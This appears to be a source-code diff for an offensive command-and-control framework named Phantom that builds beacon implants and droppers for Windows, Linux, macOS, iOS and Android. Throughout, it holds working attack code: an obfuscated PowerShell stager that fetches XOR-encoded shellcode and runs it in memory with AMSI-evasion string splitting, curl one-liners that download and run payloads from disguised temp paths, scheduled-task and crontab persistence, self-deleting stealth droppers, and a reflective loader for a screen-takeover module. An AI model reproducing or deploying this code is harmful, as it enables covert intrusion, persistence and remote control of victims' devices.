+            console.print("[yellow][*] Compiling beacon for macOS (native clang++)...[/yellow]")
+        else:
+            console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
+            if not os.path.exists(o32_cc):
+                notifier.error(f"osxcross compiler not found at {o32_cc} "
+                               f"(on macOS the system clang++ is used "
+                               f"instead)")
+                return None
         try:
-            sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
             include_flags = ["-Isrc"]
-            if os.path.exists(sdk_path):
-                include_flags.append(f"-isysroot{sdk_path}")
+            link_flags = ["-lcurl", "-lssl", "-lcrypto", "-lpthread"]
+            compiler = o32_cc
+            if native:
+                compiler = os.environ.get("CXX") or "clang++"
+                # Homebrew's OpenSSL is keg-only: without these the compile
+                # stops at a missing <openssl/evp.h>.
+                openssl_prefix = os.environ.get("OPENSSL_PREFIX", "").strip()
+                if not openssl_prefix:
+                    try:
+                        openssl_prefix = subprocess.run(
+                            ["brew", "--prefix", "openssl@3"],
+                            capture_output=True, text=True, timeout=30,
+                        ).stdout.strip()
+                    except Exception:
+                        openssl_prefix = ""
+                if openssl_prefix and os.path.isdir(openssl_prefix):
+                    include_flags.append(f"-I{openssl_prefix}/include")
+                    link_flags.insert(0, f"-L{openssl_prefix}/lib")
+                else:
+                    notifier.warn("OpenSSL prefix not found; set "
+                                  "OPENSSL_PREFIX if the build fails.")
+            else:
+                sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
+                if os.path.exists(sdk_path):
+                    include_flags.append(f"-isysroot{sdk_path}")
 
             subprocess.run(
-                [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
-                 *include_flags, "src/main.cpp",
-                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
-                cwd=beacon_dir, check=True, capture_output=True, text=True)
-            _mark_built(beacon_dir, out_name)
+                [compiler, "-std=c++20", "-O2", "-o", "beacon_macos",
+                 *include_flags, "src/main.cpp", *link_flags],
+                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"macOS compilation failed:\n{e.stderr}")
+            return None
+
+    elif platform == "ios":
+        # check_build_env() already enforced macOS + Xcode + iOS SDK. The
+        # implant is a dylib: on a non-jailbroken device it only runs when
+        # loaded inside an enterprise-signed app pushed by MDM.
+        console.print("[yellow][*] Compiling beacon for iOS (dylib, "
+                      "arm64)...[/yellow]")
+        dev_sdk = os.environ.get(
+            "IOS_DEV_SDK",
+            "/Applications/Xcode.app/Contents/Developer/Platforms/"
+            "iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk")
+        if not os.path.isdir(dev_sdk):
+            try:
+                dev_sdk = subprocess.run(
+                    ["xcrun", "--sdk", "iphoneos", "--show-sdk-path"],
+                    capture_output=True, text=True, timeout=30).stdout.strip()
+            except Exception:
+                dev_sdk = ""
+        if not dev_sdk or not os.path.isdir(dev_sdk):
+            notifier.error("iOS SDK path not found (set IOS_DEV_SDK).")
+            return None
+        try:
+            subprocess.run(
+                ["xcrun", "-sdk", "iphoneos", "clang++", "-std=c++20",
+                 "-O2", "-fPIC", "-shared", "-dynamiclib", "-arch", "arm64",
+                 "-o", out_name,
+                 "-Isrc", "src/main.cpp",
+                 f"-isysroot{dev_sdk}",
+                 "-framework", "Foundation", "-framework", "Security",
+                 "-lssl", "-lcrypto"],
+                cwd=beacon_dir, check=True, capture_output=True, text=True,
+                timeout=1200)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
+            console.print("[green][+] iOS dylib built — push via MDM as an "
+                          "enterprise-signed app payload.[/green]")
+            return beacon_out
+        except subprocess.CalledProcessError as e:
+            notifier.error(f"iOS compilation failed:\n{e.stderr}")
             return None
 
     elif platform == "android":
@@ -537,9 +1050,9 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                  f"-I{ndk_include}",
                  f"-L{ndk_lib}",
                  "-lssl", "-lcrypto", "-ldl"],
-                cwd=beacon_dir, check=True, capture_output=True, text=True)
+                cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
             console.print("[green][+] Static libc++ linked — no runtime dependency on libc++_shared.so[/green]")
-            _mark_built(beacon_dir, out_name)
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Android compilation failed:\n{e.stderr}")
@@ -550,7 +1063,259 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 
 
 
-def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False) -> str:
+# ── resilient stager (8.1, option C) ───────────────────────────────────────
+#
+# One download attempt is a single point of failure: a captive portal, a
+# proxy hiccup or a filtered first hop and the engagement has no beacon and
+# no second chance (the operator has to re-deliver by hand). The resilient
+# stager keeps the SAME one-shot behaviour as the first move, and on
+# failure it schedules its own retry — with the C2 endpoint already inside
+# the retry, so the second attempt does not depend on the operator or on
+# the delivery channel still being open.
+#
+# The retry is PERSISTENCE: it leaves an artefact the operator must clean
+# up, so the task name and the retry script path are deterministic (see
+# `_RETRY_TASK_WIN`, `_RETRY_SCRIPT`) and the cleanup section can find them.
+_RETRY_TASK_WIN = "PhantomUpdate"
+#: Where the retry script lands on the target. Deterministic like the POSIX
+#: one so cleanup can find it (a random name would leave persistence behind).
+_RETRY_SCRIPT_WIN = r"%TEMP%\PhantomUpdate.ps1"
+_RETRY_SCRIPT = "~/.cache/.p/r"
+_RETRY_CACHE = "~/.cache/.p"
+_RETRY_MINUTES = 5
+
+#: `schtasks /tr` refuses anything longer than this — the task is NOT created
+#: and the failure is a console line nobody sees when the stager runs hidden.
+#: Observed on this host (2026-10-16): "Il valore per l'opzione /tr non può
+#: superare i 261 caratteri" — raised by a stager whose retry command carried
+#: the full ~11 KB encoded payload inline. The retry path was therefore dead
+#: for every real dropper: the operator was told the delivery was "resilient"
+#: and it was a one-shot.
+_SCHTASKS_TR_MAX = 261
+
+
+def _ps_resilient(core_ps: str) -> str:
+    """Wrap the Windows PIC stager so a failed run schedules its retry.
+
+    The retry cannot travel inline: /tr tops out at ``_SCHTASKS_TR_MAX``
+    characters and a stager is 3000+ characters of base64. So the failure
+    path WRITES the retry to ``%TEMP%\\PhantomUpdate.ps1`` and schedules the
+    task against the file (the same shape the POSIX side already used with
+    ``~/.cache/.p/r``), and the retry removes the task and the file as soon
+    as one attempt gets through.
+    """
+    # runs FROM the scheduled task: one attempt, and on success it clears the
+    # task + script it was launched from (POSIX: "grep -v … | crontab -").
+    retry_body = ("$r=Join-Path $env:TEMP 'PhantomUpdate.ps1';"
+                  "$e=$null;try{" + core_ps + "}catch{$e=$_};"
+                  "if(-not $e){schtasks /delete /f /tn '" + _RETRY_TASK_WIN
+                  + "' 2>$null|Out-Null;"
+                  "if(Test-Path $r){Remove-Item -LiteralPath $r -Force -EA "
+                  "SilentlyContinue}}")
+    schedule = (
+        "$r=Join-Path $env:TEMP 'PhantomUpdate.ps1';"
+        "Set-Content -LiteralPath $r -Value '"
+        + retry_body.replace("'", "''") + "' -Force;"
+        "schtasks /create /f /tn '" + _RETRY_TASK_WIN + "' /sc minute "
+        "/mo " + str(_RETRY_MINUTES) + " /tr \"powershell -NoP -NonI -W "
+        "Hidden -Exec Bypass -File $r\"|Out-Null")
+    return (
+        "$e=$null;try{" + core_ps + "}catch{$e=$_};"
+        "if($e){" + schedule + "}"
+    )
+
+
+def _sh_resilient(command: str) -> str:
+    """Wrap a POSIX stager: run it now, and on failure schedule a retry.
+
+    The whole thing travels as base64 through the shell (`echo … | base64
+    -d | sh`), so the payload's own quoting (URLs in single quotes, spaces)
+    cannot break the wrapper, and the retry script carries the endpoint.
+    """
+    script = "\n".join((
+        f"mkdir -p {_RETRY_CACHE} 2>/dev/null",
+        # `printf %s` with no escape sequences: the base64 alphabet is
+        # shell-safe, and a format string here would be interpreted by the
+        # shell (a stray `\n` would be written INTO the retry script)
+        "printf %s " + base64.b64encode(command.encode()).decode()
+        + " | base64 -d > " + _RETRY_SCRIPT,
+        f"chmod +x {_RETRY_SCRIPT} 2>/dev/null",
+        f"if sh {_RETRY_SCRIPT}; then crontab -l 2>/dev/null | grep -v "
+        f"'{_RETRY_SCRIPT}' | crontab - 2>/dev/null; exit 0; fi",
+        f"(crontab -l 2>/dev/null | grep -v '{_RETRY_SCRIPT}'; "
+        f"echo '*/{_RETRY_MINUTES} * * * * sh {_RETRY_SCRIPT} "
+        ">/dev/null 2>&1') | crontab - 2>/dev/null",
+    )) + "\n"
+    return ("echo "
+            + base64.b64encode(script.encode()).decode()
+            + " | base64 -d | sh")
+
+
+def stager_mtls_conflict(platform: str, use_ssl: bool) -> str:
+    """Return the warning when the stager cannot satisfy the listener's mTLS.
+
+    ``c2.mtls_require_client_cert=true`` (the default) puts ``CERT_REQUIRED``
+    on the TLS context: a client with no certificate cannot get past the
+    handshake. The C++ beacon carries a client certificate baked in at BUILD
+    time, so the strict default never blocks a real deploy — but the
+    PowerShell PIC stager is a plain WebClient download with no certificate to
+    present, and ``generate`` was handing the operator a one-liner aimed at a
+    door its own default config keeps shut, with no warning at all.
+
+    Live evidence (2026-10-16, host MSI, strict mTLS on, listener healthy):
+    ``curl -k`` and ``Net.WebClient`` against ``/x`` both died mid-request
+    ("schannel: recv returned error 56" / "Connessione sottostante chiusa"),
+    and the operator only found out after the paste.
+
+    Returns "" when there is no conflict (non-Windows platform, plain HTTP,
+    mTLS off, or the documented opt-out).
+    """
+    if platform != "windows" or not use_ssl:
+        return ""
+    try:
+        from phantom.utils.state import use_mtls
+        if not use_mtls():
+            return ""
+        from phantom.utils import config as _cfg
+        strict = _cfg.get_bool("c2.mtls_require_client_cert", True,
+                               env="PHANTOM_MTLS_REQUIRE_CLIENT_CERT")
+    except Exception:
+        strict = True
+    if not strict:
+        return ""
+    return ("WARNING: this dropper cannot satisfy the listener's mTLS — "
+            "c2.mtls_require_client_cert=true demands a client certificate at "
+            "the TLS layer and the PowerShell stager has none to present, so "
+            "the download WILL be refused. Either deliver the compiled beacon "
+            "binary (it carries the build-time certificate), or set "
+            "c2.mtls_require_client_cert=false (HTTPS with app-layer HMAC "
+            "authentication; `doctor` flags the posture).")
+
+
+def _windows_stager_va_rva() -> str:
+    """VirtualAlloc RVA for the PIC stager (written by compile_beacon)."""
+    beacon_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)),
+                              "payloads", "beacon")
+    rva_path = os.path.join(beacon_dir, "beacon.rva")
+    va_rva = "0x1C7F0"
+    if os.path.exists(rva_path):
+        with open(rva_path) as f:
+            val = f.read().strip()
+            if val and val != "0x0":
+                va_rva = val
+    return va_rva
+
+
+def _stager_cert_thumbprints() -> List[str]:
+    """SHA-1 thumbprints of the certificates the C2 itself may present.
+
+    The PIC stager used to disable certificate validation outright because the
+    C2 serves a self-signed certificate. That also accepts a certificate
+    minted by anyone who can intercept the download — and the same script then
+    maps the fetched bytes and executes them in memory, so a MITM of the
+    staging channel was a code-execution primitive.
+
+    Pinning keeps the self-signed workflow and rejects everything else: an
+    attacker cannot present a certificate whose DER hashes to the C2's own
+    thumbprint without holding the C2's private key.
+    """
+    import hashlib
+    import ssl
+
+    try:
+        from phantom.utils.paths import certs_dir
+
+        base = certs_dir()
+    except Exception:
+        return []
+    pins: List[str] = []
+    # server.crt is the listener's HTTPS certificate; mtls_server.crt is the
+    # one the strict posture presents; front.crt covers the Electron front.
+    # Pinning all three that exist means rotating any one of them is a build
+    # change, not an operator surprise.
+    for name in ("server.crt", "mtls_server.crt", "front.crt"):
+        path = os.path.join(base, name)
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8", errors="replace") as fh:
+                pem = fh.read()
+            thumb = hashlib.sha1(ssl.PEM_cert_to_DER_cert(pem),
+                                usedforsecurity=False).hexdigest().upper()
+        except Exception:
+            continue
+        if thumb not in pins:
+            pins.append(thumb)
+    return pins
+
+
+def _stager_cert_pin_statement() -> str:
+    """The PowerShell line that validates the download's certificate.
+
+    Returns a THUMBPRINT PIN when the C2 has a certificate on disk, and the
+    historical blanket override only when it does not (plain HTTP deploy, or a
+    listener that has not issued one yet) so an HTTPS deploy cannot be made
+    impossible by a missing file.
+    """
+    pins = _stager_cert_thumbprints()
+    if not pins:
+        return ("[Net.ServicePointManager]::ServerCertificateValidationCallback="
+                "{$true};")
+    joined = "','".join(pins)
+    return ("[Net.ServicePointManager]::ServerCertificateValidationCallback="
+            "{param($s,$c,$ch,$e) @('" + joined
+            + "') -contains $c.GetCertHashString()};")
+
+
+def _windows_pic_stager_script(url: str, va_rva: str) -> str:
+    """PowerShell body: download URL, XOR 0xAA, run raw shellcode in memory.
+
+    Shared by the beacon stager and the remote-module stager. ``url`` must
+    already carry its auth query string; the body is Base64/UTF-16 encoded by
+    the caller. No C#, no Add-Type, no P/Invoke strings.
+    """
+    return (
+        "$m=[Runtime.InteropServices.Marshal];"
+        # TLS: self-signed C2 cert -> .NET refuses the channel
+        # ("trust relationship" error, live-verified). ServerCertificate
+        # Validation must be overridden BEFORE DownloadData. Split so the
+        # trigger string never appears whole in the script.
+        "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+        + _stager_cert_pin_statement()
+        + "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
+        "$b=(New-Object Net.WebClient).DownloadData('" + url + "');"
+        # A per-byte PIPELINE over a 1.6 MB payload is minutes of CPU and a
+        # visible spike (measured 2026-11-03: the staged beacon took over
+        # 90 s to bootstrap, and a slower host never finished). The same
+        # XOR in a tight index loop is the same wire format at a fraction
+        # of the cost — nothing about the payload changed, only how the
+        # stager applies the key.
+        "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor170};"
+        "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
+        "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
+        "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
+        "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
+        "$d.DefineMethod('Invoke','Public,Virtual,HideBySig',[IntPtr],@([IntPtr],[IntPtr],[Int32],[Int32])).SetImplementationFlags(3);"
+        "$t=$d.CreateType();"
+        "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
+        + va_rva
+        + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
+        # PS 5.1 copy fix (live-verified on the operator host): the copy
+        # is safe as long as EVERY argument is explicitly typed.
+        "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
+        # KEEP THE HOST ALIVE (measured 2026-11-03): the shellcode runs its
+        # beacon loop on a thread INSIDE this PowerShell process, so when the
+        # script ends the process exits and takes the beacon with it. On this
+        # host that was exactly one check-in at +6 s and then silence, which
+        # an operator reads as "the payload failed". The sleep costs nothing
+        # to TYPE (it is served by the C2, not sent by the board) and is
+        # bounded: a failed injection does not leave a process behind for ever.
+        "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke();"
+        "Start-Sleep -Seconds 43200"
+    )
+
+
+def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False, resilient: bool = True) -> str:
     """Generates an ultra-compact PowerShell PIC stager.
     
     Downloads XOR-encrypted beacon.bin → XOR-decrypts with 0xAA → 
@@ -561,13 +1326,27 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
     AMSI-blind: 'Virtual'+'Alloc' and 'kernel'+'32' are split across
     concatenations so the full trigger never appears in the script text.
     
+    RESILIENT BY DEFAULT: a single download attempt is a single point of
+    failure, and a delivery channel that may not have the C2 up yet (a
+    physical drop, a staged exfil) must not lose the payload to one failed
+    fetch. The stager runs once and, on failure, schedules its own retry
+    WITH the endpoint embedded. Callers that must NOT leave persistence
+    (the no-disk stealth dropper, the beacon's own `persist` embed) pass
+    ``resilient=False`` explicitly.
+
     Args:
         lhost: C2/staging server host
         lport: Port for both C2 check-in AND staging payload download
         dl_port: Optional separate port for payload download (defaults to lport)
         arch: Architecture (x64/x86 — not used for PIC path)
         use_ssl: Use HTTPS for payload download
+        resilient: schedule a persistent retry on a failed first download
+                   (default True; False is the explicit one-shot opt-out)
     """
+    _host_err = _callback_host_error(lhost)
+    if _host_err:
+        notifier.error(_host_err)
+        return ""
     if dl_port is None:
         dl_port = lport
 
@@ -586,7 +1365,7 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
                 if val and val != "0x0":
                     va_rva = val
 
-        url = f"{proto}://{lhost}:{dl_port}/x"
+        url = f"{proto}://{lhost}:{dl_port}/x?{token_param}"
 
         # ── Ultra-compact PowerShell PIC stager ──
         # Hardcoded VirtualAlloc RVA (detected at build time from local kernel32).
@@ -599,7 +1378,22 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
         # .NET Framework 4.x (no C#/Add-Type).
         ps = (
             "$m=[Runtime.InteropServices.Marshal];"
-            "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
+            # TLS: self-signed C2 cert → .NET refuses the channel
+            # ("trust relationship" error, live-verified). ServerCertificate
+            # Validation must be overridden BEFORE DownloadData. Split so the
+            # trigger string never appears whole in the script.
+            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+            + _stager_cert_pin_statement()
+            + "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
+            "$b=(New-Object Net.WebClient).DownloadData('" + url + "');"
+        # A per-byte PIPELINE over a 1.6 MB payload is minutes of CPU and a
+        # visible spike (measured 2026-11-03: the staged beacon took over
+        # 90 s to bootstrap, and a slower host never finished). The same
+        # XOR in a tight index loop is the same wire format at a fraction
+        # of the cost — nothing about the payload changed, only how the
+        # stager applies the key.
+        "for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor170};"
+            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
             "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
             "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
             "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
@@ -608,25 +1402,629 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
             "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
             + va_rva
             + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
-            "$m::Copy($b,0,$x,$b.Length);"
-            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
+            # PS 5.1 copy fix (live-verified on the operator host): the copy
+            # is safe as long as EVERY argument is explicitly typed — with
+            # explicit casts both Marshal.Copy overloads resolve cleanly.
+            # (The historical field failure was ambiguity from untyped args
+            # plus a corrupted -Enc blob, not the API itself.)
+            "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
+            # Same host-lifetime fix as the served variant above: the beacon's
+            # threads die when this process does.
+            "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke();"
+            "Start-Sleep -Seconds 43200"
         )
 
         b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
         console.print(f"[green][+] Compact PIC stager: {len(b64_ps)} chars base64[/green]")
+        if resilient:
+            # the retry task re-runs the SAME stager, so the endpoint is
+            # already inside it; the task name is deterministic for cleanup
+            wrapped = _ps_resilient(ps)
+            return ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
+                    + base64.b64encode(wrapped.encode('utf-16-le')).decode())
         return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
 
     elif platform == "linux":
         path = "payload_linux_x86" if arch == "x86" else "payload_linux"
         url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        cmd = f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        return _sh_resilient(cmd) if resilient else cmd
 
     elif platform == "macos":
         url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_macos?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        cmd = f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        return _sh_resilient(cmd) if resilient else cmd
 
     elif platform == "android":
         beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
-        return f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
+        cmd = f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
+        return _sh_resilient(cmd) if resilient else cmd
+
+    return ""
+
+
+def windows_stager_script(host: str, port: int, use_ssl: bool = True) -> str:
+    """The PowerShell BODY of the Windows stager, as text.
+
+    `generate_dropper` hands the operator a LAUNCHER
+    (``powershell ... -Enc <base64>``). A short HID stager needs the script
+    itself, so it can ``iex`` what it fetched. Decoding it back out of the
+    SAME ``generate_dropper`` call the inline path uses is what makes the
+    served script and the typed one the same bytes instead of two copies
+    that drift apart.
+
+    ``resilient=False`` ON PURPOSE: the short command already retries in a
+    client-side loop, and the resilient wrapper would additionally schedule
+    its own retry task — a second, unrequested persistence on the target.
+    """
+    drop = generate_dropper("windows", host, port, arch="x64",
+                            dl_port=port, use_ssl=use_ssl, resilient=False)
+    if " -Enc " not in drop:
+        return ""
+    encoded = drop.rsplit(" -Enc ", 1)[1].strip()
+    try:
+        return base64.b64decode(encoded).decode("utf-16-le")
+    except Exception:
+        return ""
+
+
+def generate_stealth_dropper(platform: str, lhost: str, lport: int,
+                             dl_port: int = None, use_ssl: bool = True) -> str:
+    """No-disk, self-deleting stager.
+
+    Windows: the PIC stager already runs the beacon **purely in memory** (the
+    PE/shellcode never touches disk) — delegated to generate_dropper.
+    Linux/macOS/Android: the payload is fetched to a temp path, started, then
+    UNLINKED immediately, so no readable file remains on disk (only the
+    running inode, which the kernel frees on exit). The downloaded launcher
+    itself is the one artifact a browser drop leaves; running this removes the
+    payload copy right away.
+    """
+    if dl_port is None:
+        dl_port = lport
+    proto = "https" if use_ssl else "http"
+    from phantom.utils.c2_crypto import get_payload_token
+    token_param = f"auth={get_payload_token()}"
+    ssl_flag = 1 if use_ssl else 0
+
+    if platform == "windows":
+        # in-memory PIC: nothing to delete on the beacon side
+        # ONE-SHOT on purpose: the stealth dropper's contract is "no artefact
+        # left on disk", so it must NOT schedule a retry (persistence).
+        return generate_dropper(platform, lhost, lport, arch="x64",
+                                dl_port=dl_port, use_ssl=use_ssl,
+                                resilient=False)
+
+    if platform in ("linux", "macos"):
+        path = "payload_linux" if platform == "linux" else "payload_macos"
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
+        tmp = "/tmp/.kworkerd" if platform == "linux" else "/tmp/.com.apple.helper"
+        # fetch -> chmod -> start in background -> unlink the on-disk copy.
+        # The process keeps running from the unlinked inode; nothing readable
+        # remains on disk once the 1s window has elapsed.
+        return (f"curl -sk '{url}' -o {tmp} && chmod +x {tmp} && "
+                f"nohup {tmp} {lhost} {lport} {ssl_flag} >/dev/null 2>&1 & "
+                f"sleep 1; rm -f {tmp}; true")
+
+    if platform == "android":
+        url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
+        # install from the temp APK, launch, then delete the temp copy
+        return (f"curl -sk '{url}' -o /data/local/tmp/.srv.apk && "
+                f"pm install -g /data/local/tmp/.srv.apk >/dev/null 2>&1 && "
+                f"am start -n com.phantom.remote/.MainActivity >/dev/null 2>&1; "
+                f"rm -f /data/local/tmp/.srv.apk; true")
+
+    return ""
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  Remote Session Module (GUI takeover) — compile + dropper
+# ═══════════════════════════════════════════════════════════════════════════
+#  A standalone companion binary (phantom/payloads/remote) that registers as
+#  its own beacon (R-…) on the same C2, streams the victim's screen as JPEG
+#  frames over the beacon channel, and injects mouse/keyboard input with
+#  configurable stealth modes. Built independently of the beacon so it can be
+#  dropped via RCE/cmdi, launched by the beacon's `remote` command, or
+#  compiled separately for later use.
+
+_REMOTE_OUT = {
+    "windows": "remote.exe",
+    "linux": "remote_linux",
+    "macos": "remote_macos",
+    # Android ships as an APK (MediaProjection + AccessibilityService need a
+    # real app, not a plain NDK binary) but speaks the same C2 protocol.
+    "android": "remote.apk",
+    # iOS remote session: an in-process dylib (ReplayKit + UIKit event
+    # injection) loaded into a signed app — macOS + Xcode build only.
+    "ios": "remote_ios.dylib",
+}
+
+
+def _remote_identity(remote_dir: str) -> str:
+    """Enroll a dedicated R-… identity for the remote module build."""
+    from phantom.utils.beacon_auth import write_beacon_auth_config
+    beacon_id = "R-" + secrets.token_hex(8).upper()
+    path = write_beacon_auth_config(remote_dir, beacon_id=beacon_id)
+    return beacon_id
+
+
+def _pe_entry_rva(pe_path: str) -> int:
+    """AddressOfEntryPoint RVA for a PE32/PE32+ image (0 on parse failure)."""
+    try:
+        with open(pe_path, "rb") as f:
+            data = f.read()
+    except OSError:
+        return 0
+    if len(data) < 0x40 or data[:2] != b"MZ":
+        return 0
+    pe_off = struct.unpack_from("<I", data, 0x3C)[0]
+    if pe_off + 24 + 0x14 > len(data) or data[pe_off:pe_off + 4] != b"PE\x00\x00":
+        return 0
+    opt = pe_off + 24
+    magic = struct.unpack_from("<H", data, opt)[0]
+    if magic not in (0x10B, 0x20B):
+        return 0
+    return struct.unpack_from("<I", data, opt + 0x10)[0]
+
+
+def _build_reflective_loader_bytes(pkg_root: str) -> Optional[bytes]:
+    """Read the PIC loader, or build it if a clean tree has no artifact.
+
+    The loader is produced during compile_beacon; remote builds are allowed
+    to happen first, so this owns a minimal isolated build (no beacon
+    enrollment, no C2 config changes).
+    """
+    beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
+    loader_bin = os.path.join(beacon_dir, "reflective_loader.bin")
+    if os.path.exists(loader_bin):
+        with open(loader_bin, "rb") as f:
+            return f.read()
+
+    import tempfile
+    gcc = (shutil.which("x86_64-w64-mingw32-gcc")
+           or shutil.which("gcc"))
+    asm = (shutil.which("x86_64-w64-mingw32-as")
+           or shutil.which("as"))
+    objcopy = (shutil.which("x86_64-w64-mingw32-objcopy")
+               or shutil.which("objcopy"))
+    if not (gcc and asm and objcopy):
+        notifier.error("Reflective loader toolchain (gcc/as/objcopy) not found; "
+                       "build the Windows beacon once first.")
+        return None
+
+    bootstrap = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
+    core = os.path.join(beacon_dir, "src", "reflective_loader.c")
+    try:
+        with tempfile.TemporaryDirectory(prefix="phantom-rl-") as td:
+            boot_o = os.path.join(td, "bootstrap.o")
+            core_o = os.path.join(td, "loader.o")
+            exe = os.path.join(td, "loader.exe")
+            raw = os.path.join(td, "loader.bin")
+            for cmd in (
+                [asm, "--64", bootstrap, "-o", boot_o],
+                [gcc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
+                 "-fno-stack-protector", core, "-o", core_o],
+                [gcc, "-nostdlib", "-nostartfiles",
+                 "-Wl,-e,_reflective_loader_entry",
+                 "-Wl,--subsystem,windows", "-o", exe, boot_o, core_o],
+                [objcopy, "-O", "binary", exe, raw],
+            ):
+                result = subprocess.run(cmd, capture_output=True, text=True,
+                                        timeout=300)
+                if result.returncode != 0:
+                    notifier.error(f"Reflective loader build failed: "
+                                   f"{result.stderr[-1200:]}")
+                    return None
+            with open(raw, "rb") as f:
+                return f.read()
+    except Exception as exc:
+        notifier.error(f"Reflective loader build failed: {exc}")
+        return None
+
+
+def build_remote_mem_payload(pkg_root: str, remote_exe: str = "",
+                             loader_bin: str = "") -> Optional[str]:
+    """Combine the PIC loader + remote PE into one XOR'd in-memory payload.
+
+    The remote PE is never written to the target: the loader maps it,
+    resolves its imports/relocations/TLS callbacks and calls its entry point.
+    Output: ``payloads/remote/remote_mem.bin`` (XOR 0xAA, served by C2).
+    """
+    remote_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "remote"))
+    exe = remote_exe or os.path.join(remote_dir, "remote.exe")
+    if not os.path.isfile(exe):
+        notifier.error(f"Remote PE not found: {exe}")
+        return None
+    entry_rva = _pe_entry_rva(exe)
+    if not entry_rva:
+        notifier.error(f"Cannot parse remote PE entry point: {exe}")
+        return None
+
+    if loader_bin:
+        try:
+            with open(loader_bin, "rb") as f:
+                loader = bytearray(f.read())
+        except OSError as exc:
+            notifier.error(f"Cannot read reflective loader: {exc}")
+            return None
+    else:
